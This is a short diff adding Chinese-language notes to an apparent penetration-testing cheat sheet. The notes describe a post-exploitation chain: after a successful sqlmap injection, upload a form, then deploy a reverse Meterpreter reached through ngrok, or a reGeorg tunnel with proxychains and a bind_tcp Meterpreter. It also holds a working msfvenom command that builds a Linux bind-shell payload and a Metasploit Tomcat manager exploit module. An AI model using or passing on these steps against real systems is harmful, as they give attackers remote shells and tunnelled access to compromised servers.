@@ -1,4 +1,16 @@
 
+
+sqlmap 成功之后 上传 form ( 直接上 meterpreter 可能是太大了,文件大小总不相同 )
+之后
+    1
+        用 form 上传 reverse 的 meterpreter
+        没有 meterpreter 用的 外网 可以用 ngrok 暂时解决 ( 临时的ngrok ip变化的时候 session 会断开 )
+    2
+        用 form 上传 reGeorg 的 tunnel
+        之后 结合 proxychains , 再上传 bind_tcp 的 meterpreter
+
+
+
 msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=4445 -f elf -o /root/a
 
 use exploit/multi/http/tomcat_mgr_deploy
